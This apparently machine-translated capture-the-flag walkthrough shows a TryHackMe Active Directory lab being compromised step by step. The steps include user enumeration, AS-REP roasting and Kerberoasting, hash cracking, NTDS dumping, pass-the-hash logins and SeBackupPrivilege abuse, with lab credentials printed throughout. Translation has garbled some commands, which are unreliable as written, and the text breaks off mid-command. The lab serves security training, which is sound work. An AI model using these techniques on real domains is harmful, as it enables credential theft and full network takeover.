<html>
<head>
<title>RazorBlack-Walkthrough [THM]</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">剃刀黑-穿越[THM]</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/razorblack-walkthrough-thm-fde0790c182f?source=collection_archive---------0-----------------------#2021-07-29">https://infosecwriteups.com/razorblack-walkthrough-thm-fde0790c182f?source=collection_archive---------0-----------------------#2021-07-29</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="222a" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">了解如何通过CTF攻击Windows Active Directory</h2></div><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi kf"><img src="../Images/54a00e3c9d93fd77bb9707ef56a8d669.png" data-original-src="https://miro.medium.com/v2/resize:fit:1110/format:webp/1*_joOT04Ug4LDX_UyROqNDQ.jpeg"/></div></figure><h1 id="209d" class="kn ko iq bd kp kq kr ks kt ku kv kw kx jw ky jx kz jz la ka lb kc lc kd ld le bi translated">描述</h1><p id="96b3" class="pw-post-body-paragraph lf lg iq lh b li lj jr lk ll lm ju ln lo lp lq lr ls lt lu lv lw lx ly lz ma ij bi translated"><strong class="lh ir">剃刀黑</strong>是<strong class="lh ir"> TryHackMe </strong>上的中等等级房间。它有一个相当有趣的描述<strong class="lh ir">“这些家伙自称黑客。你能告诉他们谁是老板吗？？</strong>”</p><p id="c564" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">本次挑战的目标是让您熟悉Active Directory枚举和利用。这篇文章涵盖了以下内容。</p><ul class=""><li id="5add" class="mg mh iq lh b li mb ll mc lo mi ls mj lw mk ma ml mm mn mo bi translated">背景</li><li id="068e" class="mg mh iq lh b li mp ll mq lo mr ls ms lw mt ma ml mm mn mo bi translated">枚举域控制器</li><li id="8ae3" class="mg mh iq lh b li mp ll mq lo mr ls ms lw mt ma ml mm mn mo bi translated">利用Kerberos</li><li id="cb59" class="mg mh iq lh b li mp ll mq lo mr ls ms lw mt ma ml mm mn mo bi translated">管理员权限提升</li></ul><div class="mu mv gp gr mw mx"><a href="https://tryhackme.com/room/raz0rblack" rel="noopener  ugc nofollow" target="_blank"><div class="my ab fo"><div class="mz ab na cl cj nb"><h2 class="bd ir gy z fp nc fr fs nd fu fw ip bi translated">剃刀黑</h2><div class="ne l"><h3 class="bd b gy z fp nc fr fs nd fu fw dk translated">这些家伙自称黑客。你能告诉他们谁是老板吗？？</h3></div><div class="nf l"><p class="bd b dl z fp nc fr fs nd fu fw dk translated">tryhackme.com</p></div></div><div class="ng l"><div class="nh l ni nj nk ng nl kl mx"/></div></div></a></div></div><div class="ab cl nm nn hu no" role="separator"><span class="np bw bk nq nr ns"/><span class="np bw bk nq nr ns"/><span class="np bw bk nq nr"/></div><div class="ij ik il im in"><h1 id="acd2" class="kn ko iq bd kp kq nt ks kt ku nu kw kx jw nv jx kz jz nw ka lb kc nx kd ld le bi translated">列举</h1><p id="8d65" class="pw-post-body-paragraph lf lg iq lh b li lj jr lk ll lm ju ln lo lp lq lr ls lt lu lv lw lx ly lz ma ij bi translated">让我们点燃NMAP，看看它能给我们带来什么</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="4c63" class="od ko iq nz b gy oe of l og oh">Starting Nmap 7.80 ( <a class="ae oi" href="https://nmap.org" rel="noopener ugc nofollow" target="_blank">https://nmap.org</a> ) at 2021–07–17 21:34 IST<br/>Nmap scan report for 10.10.25.33<br/>Host is up (0.22s latency).<br/>Not shown: 986 closed ports<br/>PORT STATE SERVICE<br/>53/tcp open domain<br/>88/tcp open kerberos-sec<br/>111/tcp open rpcbind<br/>135/tcp open msrpc<br/>139/tcp open netbios-ssn<br/>389/tcp open ldapsoft-ds<br/>464/tcp open kpasswd5<br/>593/tcp open http-rpc-epmap<br/>636/tcp open ldapssl<br/>2049/tcp open nfs<br/>3268/tcp open globalcatLDAP<br/>3269/tcp open globalcatLDAPssl<br/>3389/tcp open ms-wbt-server</span></pre><p id="6447" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">我们可以在这里看到一个活动目录的所有公共端口。</p><p id="ba3d" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated"><strong class="lh ir"> 1:域名是什么？</strong></p><p id="c24f" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">我们可以执行各种扫描来找出域名，但我将使用NMAP。我们发现端口<code class="fe oj ok ol nz b">389</code>是打开的，因此我们将使用它</p><blockquote class="om on oo"><p id="ea05" class="lf lg op lh b li mb jr lk ll mc ju ln oq md lq lr or me lu lv os mf ly lz ma ij bi translated">nmap -n -sV —编写“ldap*而非暴力”脚本-p 389 $IP</p></blockquote><p id="e985" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">这将给出关于<code class="fe oj ok ol nz b">LDAP</code>和域名的其他重要信息。</p><p id="a528" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">史蒂文的国旗是什么？</p><p id="6e29" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">现在我们需要进一步列举机器。</p><h2 id="dad2" class="od ko iq bd kp ot ou dn kt ov ow dp kx lo ox oy kz ls oz pa lb lw pb pc ld pd bi translated">#端口111</h2><p id="a61b" class="pw-post-body-paragraph lf lg iq lh b li lj jr lk ll lm ju ln lo lp lq lr ls lt lu lv lw lx ly lz ma ij bi translated">我们将从这里开始。既然我们已经验证了一个NFS服务正在运行(2049/TCP开放NFS)，我们可以进一步深入，看看我们还能获得什么。</p><blockquote class="om on oo"><p id="6e84" class="lf lg op lh b li mb jr lk ll mc ju ln oq md lq lr or me lu lv os mf ly lz ma ij bi translated">showmount -e 10.10.25.33</p></blockquote><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="c834" class="od ko iq nz b gy oe of l og oh">Export list for 10.10.25.33:<br/>  /users (everyone)</span></pre><p id="4ace" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">任何人都可以访问<strong class="lh ir"> /users </strong>文件夹。让我们试着安装它</p><blockquote class="om on oo"><p id="17ce" class="lf lg op lh b li mb jr lk ll mc ju ln oq md lq lr or me lu lv os mf ly lz ma ij bi translated">挂载10.10.25.33:/users /mnt/users</p></blockquote><p id="da13" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">在共享文件<strong class="lh ir"> employee_status.xlsx </strong>和<strong class="lh ir"> sbradley.txt中找到两个文件</strong>找到sbradley.txt中的标志并检查另一个文件。</p><p id="317a" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">文件<strong class="lh ir"> employee_status.xlsx </strong>包含了一串雇员的名字。</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="d547" class="od ko iq nz b gy oe of l og oh">daven port<br/>imogen royce<br/>tamara vidal<br/>arthur edwards<br/>carl ingram<br/>nolan cassidy<br/>reza zaydan<br/>ljudmila vetrova<br/>rico delgado<br/>tyson williams<br/>steven bradley<br/>chamber lin</span></pre><p id="5cfb" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">我们将根据使用的命名约定<br/><em class="op">Steven Bradley-&gt;s Bradley</em>制作一个修改后的用户文件</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="c2a1" class="od ko iq nz b gy oe of l og oh"><br/>dport<br/>iroyce<br/>tvidal<br/>aedwards<br/>cingram<br/>ncassidy<br/>rzaydan<br/>lvetrova<br/>rdelgado<br/>twilliams<br/>sbradley<br/>clin</span></pre><p id="7f22" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">压缩文件的密码是什么？</p><p id="e0bb" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">现在我们有了一个用户列表，让我们用Kerberos来试试。我们将使用<code class="fe oj ok ol nz b">IMPACKET’s GetNPUsers</code>从我们的用户列表中强行删除Kerebos和现有用户的散列。</p><p id="1054" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">将机器IP地址添加到<code class="fe oj ok ol nz b">/etc/hosts</code>文件中以继续攻击，否则，您将无法使用该工具</p><blockquote class="om on oo"><p id="c1c8" class="lf lg op lh b li mb jr lk ll mc ju ln oq md lq lr or me lu lv os mf ly lz ma ij bi translated">python 3 getnpusers . py-不传递raz0rblack.thm/-users file users . txt-format hashcat-output file hashes . txt</p></blockquote><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="b21f" class="od ko iq nz b gy oe of l og oh">cat hashes.txt</span><span id="2b87" class="od ko iq nz b gy pe of l og oh">$krb5asrep$23$twilliams@RAZ0RBLACK.THM:f944c5614c2277ef59298b93b1e0444d$71dca0c34c4867377c6bb3a24d6496ac00339a69aa7ea9368b2dc4e3b5c7c692b95170a087cd57137076f628b2f48ec17ae51271012e9bf948d8d07ef92a84f6a2d01699fa2fc70c1551cfaccd08f3d81ce7187674a62d765dbcda4e15ed32348f6c3329d7014d959daefa42ecf0733a560e17df190a519f8daee10713f21dfb6246641f806ec0e370229705e6a65a0024b4169e0504a29b1aea2d9e02d2fe314de02cb90976038e361cfe557f94d78d7e9c05580527ec4432c16951290dbf548dc09ed09022ad72f158424fba1fe5a9a33d1f584e937410f3e4abcfe1fdb0d60addd428b1029b6fd266eda973a1f465</span></pre><p id="b1ac" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">让我们来破解哈希。</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="2162" class="od ko iq nz b gy oe of l og oh">hashcat -m 18200 hashes.txt rockyou.txt</span></pre><p id="b966" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">在SMB上测试这些信用</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="fca4" class="od ko iq nz b gy oe of l og oh">smbmap -H $IP -u twilliams -p roastpotatoes<br/>[+] IP: <!-- -->10.10.25.33<!-- -->:445        Name: <!-- -->10.10.25.33<br/>        <!-- -->Disk                        Comment<br/>        ----                        -------<br/>        ADMIN$                  Remote Admin<br/>        C$                      Default share<br/>        IPC$                    Remote IPC<br/>        NETLOGON                Logon server share<br/>        SYSVOL                  Logon server share<br/>        trash                   Files Pending for deletion</span></pre><p id="8d3c" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">我们可以访问<code class="fe oj ok ol nz b">IPC$</code> <code class="fe oj ok ol nz b">NETLOGON</code> <code class="fe oj ok ol nz b">SYSVOL</code>但是里面没有什么有趣的东西。还有另一个文件夹，里面有一条有趣的评论<code class="fe oj ok ol nz b">trash</code>，但是我们没有权限阅读。我们可以暴力破解，看看其他用户是否有相同的密码。</p><p id="e7c3" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">保留以前使用的文件<code class="fe oj ok ol nz b">user.txt</code>，用以前用户的密码制作一个文件<code class="fe oj ok ol nz b">pass.txt</code>。</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="9864" class="od ko iq nz b gy oe of l og oh">crackmapexec smb $IP -u users.txt -p pass.txt</span><span id="68bc" class="od ko iq nz b gy pe of l og oh">SMB         10.10.25.33    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE</span></pre><p id="84d2" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">对于用户<code class="fe oj ok ol nz b">sbradley</code>,我们发现一条有趣的消息<code class="fe oj ok ol nz b">STATUS_PASSWORD_MUST_CHANGE</code>,消息的原因是指定的密码过期了。所以还是改密码吧。</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="6ec2" class="od ko iq nz b gy oe of l og oh">smbpasswd -r $IP -U sbradley<br/>Old SMB password: roastpotatoes<br/>New SMB password: testing<br/>Retype new SMB password: testing<br/>Password changed for user sbradley on 10.10.25.33</span></pre><p id="7959" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">现在用新密码枚举SMB</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="f698" class="od ko iq nz b gy oe of l og oh">smbmap -H $IP -u sbradley -p 'testing'<br/>[+] IP: <!-- -->10.10.25.33<!-- -->:445        Name: <!-- -->10.10.25.33<br/>        <!-- -->Disk                        Comment<br/>        ----                        -------<br/>        ADMIN$                  Remote Admin<br/>        C$                      Default share<br/>        IPC$                    Remote IPC<br/>        NETLOGON                Logon server share<br/>        SYSVOL                  Logon server share<br/>        trash                   Files Pending for deletion</span></pre><p id="1fb6" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">现在我们有了对<code class="fe oj ok ol nz b">trash</code>的读取权限。下载这里找到的所有东西并进行分析。</p><p id="addb" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">这里有3个文件。</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="f8dd" class="od ko iq nz b gy oe of l og oh">chat_log_20210222143423.txt         <br/>experiment_gone_wrong.zip           <br/>sbradley.txt<br/></span></pre><p id="f402" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">两个员工之间的精彩对话。这给了我们一个深入了解，我们将做什么来进一步利用这台机器。</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="59f4" class="od ko iq nz b gy oe of l og oh">- cat chat_log_20210222143423.txt </span><span id="1d75" class="od ko iq nz b gy pe of l og oh">sbradley&gt; Hey Administrator our machine has the newly disclosed vulnerability for Windows Server 2019.</span><span id="c184" class="od ko iq nz b gy pe of l og oh">Administrator&gt; What vulnerability??</span><span id="5459" class="od ko iq nz b gy pe of l og oh">sbradley&gt; That new CVE-2020-1472 which is called ZeroLogon has released a new PoC.</span><span id="070b" class="od ko iq nz b gy pe of l og oh">Administrator&gt; I have given you the last warning. If you exploit this on this Domain Controller as you did previously on our old Ubuntu server with dirtycow, I swear I will kill your WinRM-Access.</span><span id="34c0" class="od ko iq nz b gy pe of l og oh">sbradley&gt; Hey you won't believe what I am seeing.</span><span id="5b71" class="od ko iq nz b gy pe of l og oh">Administrator&gt; Now, don't say that you ran the exploit.</span><span id="9c02" class="od ko iq nz b gy pe of l og oh">sbradley&gt; Yeah, The exploit works great it needs nothing like credentials. Just give it IP and domain name and it resets the Administrator pass to an empty hash.</span><span id="fe6b" class="od ko iq nz b gy pe of l og oh">sbradley&gt; I also used some tools to extract ntds. dit and SYSTEM.hive and transferred it into my box. I love running secretsdump.py on those files and dumped the hash.</span><span id="b394" class="od ko iq nz b gy pe of l og oh">Administrator&gt; I am feeling like a new cron has been issued in my body named heart attack which will be executed within the next minute.</span><span id="3685" class="od ko iq nz b gy pe of l og oh">Administrator&gt; But, Before I die I will kill your WinRM access..........</span><span id="9187" class="od ko iq nz b gy pe of l og oh">sbradley&gt; I have made an encrypted zip containing the ntds.dit and the SYSTEM.hive and uploaded the zip inside the trash share.</span><span id="8f66" class="od ko iq nz b gy pe of l og oh">sbradley&gt; Hey Administrator are you there ...</span><span id="7b88" class="od ko iq nz b gy pe of l og oh">sbradley&gt; Administrator .....</span><span id="4120" class="od ko iq nz b gy pe of l og oh">The administrator died after this incident.</span><span id="5037" class="od ko iq nz b gy pe of l og oh">Press F to pay respects</span></pre><p id="0abb" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">现在让我们打开拉链，看看里面的东西</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="cf5f" class="od ko iq nz b gy oe of l og oh">- zip2john experiment_gone_wrong.zip &gt; hash2.txt</span><span id="63c2" class="od ko iq nz b gy pe of l og oh">- <!-- -->john --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt</span><span id="043a" class="od ko iq nz b gy pe of l og oh">- unzip experiment_gone_wrong.zip<br/>   Archive:  experiment_gone_wrong.zip<br/>   [experiment_gone_wrong.zip] system.hive password:electromagnetismo<br/>  inflating: system.hive<br/>  inflating: ntds.dit</span></pre><p id="16de" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated"><strong class="lh ir">4:Ljudmila的Hash是什么？</strong></p><p id="5567" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">如前所述，我们可以使用<code class="fe oj ok ol nz b">secretsdump.py</code>从之前解压缩的文件中获取散列值。</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="f9fa" class="od ko iq nz b gy oe of l og oh">python3 /opt/impacket/examples/secretsdump.py -system system.hive         -ntds ntds.dit LOCAL &gt; hashes3.txt</span></pre><p id="f776" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">我们需要做一些格式化，只得到散列，这样我们就可以暴力破解它。现在您可以进行暴力破解并获得正确的散列</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="8dee" class="od ko iq nz b gy oe of l og oh">crackmapexec smb $IP -u lvetrova -H hashes3.txt</span></pre><p id="2b68" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated"><strong class="lh ir"> 5:柳德米拉的旗帜是什么？</strong></p><p id="8000" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">我们将使用上一个问题中获得的散列来连接到使用<code class="fe oj ok ol nz b">Evil-WinRM</code>的系统</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="923d" class="od ko iq nz b gy oe of l og oh">evil-winrm -i $IP -u lvetrova -H f220d3988deb3f516c73f40ee16c431d<!-- --> </span></pre><p id="c75e" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">PowerShell有一种存储加密凭据的方法，只有存储这些凭据的用户帐户才能访问这些凭据。要检索凭证并在脚本中使用它，需要从XML文件中读取它。我们将使用这个方法来获取用户的散列</p><p id="b549" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated"><code class="fe oj ok ol nz b">PS C:\Users\lvetrova&gt; $Credential = Import-Clixml -Path "lvetrova.xml"<br/><br/>PS C:\Users\lvetrova&gt; $Credential.GetNetworkCredential().password</code></p><p id="06df" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated"><strong class="lh ir">6:xyan 1d 3的密码是什么？</strong></p><p id="108f" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">我们将使用带有<code class="fe oj ok ol nz b">lvetrova</code>凭证的散列函数:</p><p id="16cb" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">pass the hash攻击是一种利用漏洞的攻击，攻击者窃取一个<a class="ae oi" href="https://searchsqlserver.techtarget.com/definition/hashing" rel="noopener ugc nofollow" target="_blank">哈希</a>用户凭证，在不破解它的情况下，重新使用它来欺骗认证系统在同一网络上创建一个新的认证会话。</p><p id="7d62" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">传递散列主要是一种横向移动技术。这意味着黑客在已经损害设备之后，正在使用pass hash来提取额外的信息和凭证。</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="2bd9" class="od ko iq nz b gy oe of l og oh">python3 /opt/impacket/examples/GetUserSPNs.py raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile hashes4.txt</span></pre><p id="2fea" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">我们得到了Xyan1d3帐户的散列值，现在让我们来破解它。</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="2be3" class="od ko iq nz b gy oe of l og oh">hashcat -m 13100 hashes4.txt rockyou.txt</span></pre><p id="75ab" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated"><strong class="lh ir">7:xyan 1d 3的旗帜是什么？</strong></p><p id="9de8" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">使用上一步中找到的凭据登录。</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="b3a6" class="od ko iq nz b gy oe of l og oh">evil-winrm -i $IP -u xyan1d3 -p cyanide9amine5628</span></pre><p id="e787" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">使用ques 5中使用的相同技术来转储密码。</p><p id="1da0" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated"><code class="fe oj ok ol nz b">PS C:\Users\xyan1d3&gt; $Credential = Import-Clixml -Path "xyan1d3.xml"<br/>PS C:\Users\xyan1d3&gt; $Credential.GetNetworkCredential().password</code></p><p id="43f0" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated"><strong class="lh ir"> 8:根旗是什么？</strong></p><p id="555b" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">现在挑战的最艰难部分来了，特权升级。这让我困惑了好一会儿，但是在搜索了一下之后，我找到了如何继续下去的方法。</p><p id="86c8" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">首先，让我们看看用户拥有什么特权</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="1ed9" class="od ko iq nz b gy oe of l og oh">*Evil-WinRM* PS C:\Users\xyan1d3&gt; whoami /all</span><span id="7495" class="od ko iq nz b gy pe of l og oh">[...]</span><span id="2f05" class="od ko iq nz b gy pe of l og oh">PRIVILEGES INFORMATION<br/>----------------------</span><span id="7271" class="od ko iq nz b gy pe of l og oh">Privilege Name                Description                    State<br/>============================= ============================== =======<br/>SeMachineAccountPrivilege     Add workstations to domain     Enabled<br/>SeBackupPrivilege             Back up files and directories  Enabled<br/>SeRestorePrivilege            Restore files and directories  Enabled<br/>SeShutdownPrivilege           Shut down the system           Enabled<br/>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled<br/>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled</span></pre><p id="3e43" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">有趣的是</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="ac31" class="od ko iq nz b gy oe of l og oh">SeBackupPrivilege             Back up files and directories  Enabled</span></pre><p id="052a" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">这种特定的权限提升基于为用户分配<strong class="lh ir">权限权限</strong>的行为。它旨在允许用户创建系统的备份副本。该权限允许用户读取所有文件中的任何文件，其中可能还包括一些敏感文件，如<strong class="lh ir"> SAM文件或系统注册表文件</strong>。从攻击者的角度来看，在获得系统中的初始立足点，然后通过读取SAM文件并可能破解系统或网络上的高权限用户的密码，移动到提升的外壳后，就可以利用这一点。</p><p id="44ed" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">在利用这个漏洞之前，我们需要将域凭证转储到一个文件中。为此，我们将使用<a class="ae oi" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#using-diskshadow-a-windows-signed-binary" rel="noopener ugc nofollow" target="_blank"> <strong class="lh ir"> DiskShadow(一个Windows签名的二进制)</strong> </a> <strong class="lh ir">。</strong></p><p id="4614" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">准备<code class="fe oj ok ol nz b">diskshadow.txt</code></p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="e9de" class="od ko iq nz b gy oe of l og oh">- cat diskshadow.txt</span><span id="1669" class="od ko iq nz b gy pe of l og oh">set metadata C:\tmp\tmp.cabs <br/>set context persistent nowriters <br/>add volume c: alias someAlias <br/>create <br/>expose %someAlias% h:</span></pre><p id="17f2" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">将此文件上传到机器</p><p id="0b8c" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated"><code class="fe oj ok ol nz b">*Evil-WinRM* PS C:\Users\xyan1d3&gt; mkdir C:\tmp <br/>*Evil-WinRM* PS C:\tmp&gt; upload diskshadow.txt</code></p><p id="5994" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">从创建的目录中执行<code class="fe oj ok ol nz b">diskshadow.exe</code></p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="5094" class="od ko iq nz b gy oe of l og oh">*Evil-WinRM* PS C:\tmp&gt; diskshadow.exe /s c:\tmp\diskshadow.txt</span><span id="91c5" class="od ko iq nz b gy pe of l og oh">Microsoft DiskShadow version 1.0<br/>Copyright (C) 2013 Microsoft Corporation<br/>On computer:  HAVEN-DC<br/><br/>-&gt; set metadata C:\tmp\tmp.cabs<br/>-&gt; set context persistent nowriters<br/>-&gt; add volume c: alias someAlias<br/>-&gt; create<br/>Alias someAlias for shadow ID {29b531e8-3c00-49f9-925d-5e1e3937af13} set as environment variable.<br/>Alias VSS_SHADOW_SET for shadow set ID {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6} set as environment variable.<br/><br/>Querying all shadow copies with the shadow copy set ID {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6}<br/><br/>        * Shadow copy ID = {29b531e8-3c00-49f9-925d-5e1e3937af13}               %someAlias%<br/>                - Shadow copy set: {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6}       %VSS_SHADOW_SET%<br/>                - Original count of shadow copies = 1<br/>                - Original volume name: \\?\Volume{115c1f55-0000-0000-0000-602200000000}\ [C:\]<br/>                - Creation time: 7/16/2021 3:45:20 PM<br/>                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1<br/>                - Originating machine: HAVEN-DC.raz0rblack.thm<br/>                - Service machine: HAVEN-DC.raz0rblack.thm<br/>                - Not exposed<br/>                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}<br/>                - Attributes:  No_Auto_Release Persistent No_Writers Differential<br/><br/>Number of shadow copies listed: 1<br/>-&gt; expose %someAlias% h:<br/>-&gt; %someAlias% = {29b531e8-3c00-49f9-925d-5e1e3937af13}<br/>The shadow copy was successfully exposed as h:\.</span></pre><p id="f138" class="pw-post-body-paragraph lf lg iq lh b li mb jr lk ll mc ju ln lo md lq lr ls me lu lv lw mf ly lz ma ij bi translated">现在让我们滥用的特权。为此，我们需要几个<code class="fe oj ok ol nz b">dll</code>文件，可以从<a class="ae oi" href="https://github.com/giuliano108/SeBackupPrivilege" rel="noopener ugc nofollow" target="_blank"> <strong class="lh ir">这里</strong> </a>下载。下载后，我们需要以下面的方式执行它，然后下载散列。</p><pre class="kg kh ki kj gt ny nz oa ob aw oc bi"><span id="7b99" class="od ko iq nz b gy oe of l og oh">*Evil-WinRM* PS C:\tmp&gt; upload 